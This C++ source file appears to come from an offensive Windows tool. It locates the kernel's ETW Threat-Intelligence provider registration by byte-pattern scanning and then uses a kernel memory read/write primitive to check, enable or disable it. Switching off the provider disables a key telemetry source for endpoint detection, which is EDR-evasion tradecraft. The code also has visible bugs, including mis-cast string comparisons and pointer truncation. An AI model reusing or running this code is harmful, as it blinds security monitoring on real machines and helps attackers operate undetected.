#include "ETWTIUtil.h"
#include <tchar.h>

PVOID ETWTI::ResolveDriverBase(const wchar_t* strDriverName)
{
	DWORD szBuffer = 0x2000;
	BOOL bRes = FALSE;
	DWORD dwSizeRequired = 0;
	wchar_t buffer[256] = { 0 };
	LPVOID lpBase = NULL;
	HANDLE hHeap = GetProcessHeap();
	if (!hHeap) {
		return NULL;
	}

	LPVOID lpBuf = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, szBuffer);
	if (!lpBuf) {
		return NULL;
	}

	bRes = EnumDeviceDrivers((LPVOID*)lpBuf, szBuffer, &dwSizeRequired);
	if (!bRes) {
		HeapFree(hHeap, 0, lpBuf);
		lpBuf = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwSizeRequired);
		if (!lpBuf) {
			return NULL;
		}
		szBuffer = dwSizeRequired;
		bRes = EnumDeviceDrivers((LPVOID*)lpBuf, szBuffer, &dwSizeRequired);
		if (!bRes) {
			printf("Failed to allocate space for device driver base array\n");
			return NULL;
		}
	}

	SIZE_T szNumDrivers = szBuffer / sizeof(PVOID);

	for (SIZE_T i = 0; i < szNumDrivers; i++) {
		PVOID lpBaseIter = ((LPVOID*)lpBuf)[i];
		GetDeviceDriverBaseNameW(lpBaseIter, buffer, 256);
		if (!lstrcmpiW(strDriverName, buffer)) {
			lpBase = lpBaseIter;
			break;
		}
	}

	HeapFree(hHeap, 0, lpBuf);
	return lpBase;
}

ETWTI::ETWTI(MemHandler* objMemHandlerArg)
{

	this->objMemHandler = objMemHandlerArg;
	this->lpNtosBase = this->ResolveDriverBase(L"ntoskrnl.exe");
	this->lpnetioBase = ResolveDriverBase(L"netio.sys");
}


BOOL ETWTI::EnumerateETW(BOOLEAN REMOVE, wchar_t* whattodo) {
	LPVOID StartSearch = NULL;
	LPVOID EndSearch = NULL;
	DWORD distance = 0;
	LPVOID pEtwThreat = NULL;
	HMODULE hNtosBase = LoadLibraryW(L"ntoskrnl.exe");
	if (!hNtosBase) {
		return NULL;
	}

	StartSearch = GetProcAddress(hNtosBase, "KeInsertQueueApc");
	EndSearch = (LPVOID) ((DWORD64) GetProcAddress(hNtosBase, "KeInsertQueueApc") + (DWORD64) 0x1000);

	printf("StartSearch %llx\n", StartSearch);
	 
	while (StartSearch <= EndSearch) {
		if ((((PBYTE)StartSearch)[0] == patternEtwThreatIntProvRegHandle[0]) && (((PBYTE)StartSearch)[1] == patternEtwThreatIntProvRegHandle[1]) && (((PBYTE)StartSearch)[2] == patternEtwThreatIntProvRegHandle[2]) && (((PBYTE)StartSearch)[3] == patternEtwThreatIntProvRegHandle[3]) && (((PBYTE)StartSearch)[4] == patternEtwThreatIntProvRegHandle[4]) && (((PBYTE)StartSearch)[5] == patternEtwThreatIntProvRegHandle[5])) {
			distance = *(PDWORD)((DWORD_PTR)StartSearch - 4);
			pEtwThreat = (LPVOID)((DWORD_PTR)StartSearch + distance); 
			break;
		}

		StartSearch = (LPVOID)((DWORD64)StartSearch + 0x01);
	}

	// Calculate offset
	DWORD Offset = (DWORD)pEtwThreat - (DWORD)hNtosBase;

	printf("Offset %llx\n", Offset);
	
	LPVOID pEtwRegEntry = NULL;
	BOOL b = this->objMemHandler->VirtualRead(
		(DWORD64)this->lpNtosBase + Offset,
		&pEtwRegEntry,
		sizeof(pEtwRegEntry)
	);
	if (!b) return FALSE;

	printf("[+] nt!_ETW_REG_ENTRY : %llx\n", (PDWORD64)pEtwRegEntry);

	LPVOID pEtwGuidEntry = NULL;
	b = this->objMemHandler->VirtualRead(
		(DWORD64)pEtwRegEntry + GuidEntry_OFFSET,
		&pEtwGuidEntry,
		sizeof(pEtwGuidEntry)
	);
	if (!b) return FALSE;

	printf("[+] nt!_ETW_REG_ENTRY : %llx\n", (PDWORD64)pEtwGuidEntry);
	
	DWORD isEnabled = 0;
	b = this->objMemHandler->VirtualRead(
		(DWORD64)pEtwGuidEntry + ProviderEnableInfo_OFFSET,
		&isEnabled,
		sizeof(isEnabled)
	);
	if (!b) return FALSE;

	if (whattodo != NULL && wcscmp(whattodo, (const wchar_t*)"check") == 0) {
		printf("[+] IsEnabled: %d\n", isEnabled);
	}
	else if (whattodo != NULL && wcscmp(whattodo, (const wchar_t*)"enable") == 0) {
		b = this->objMemHandler->WriteMemoryPrimitive(
			4,
			(DWORD64)pEtwGuidEntry + ProviderEnableInfo_OFFSET,
			0x01
		);
		if (!b) return FALSE;
	}
	else if (whattodo != NULL && wcscmp(whattodo, (const wchar_t*)"disable") == 0) {
		b = this->objMemHandler->WriteMemoryPrimitive(
			4,
			(DWORD64)pEtwGuidEntry + ProviderEnableInfo_OFFSET,
			0x00
		);
		if (!b) return FALSE;
	}
}

ETWTI::~ETWTI()
{
}
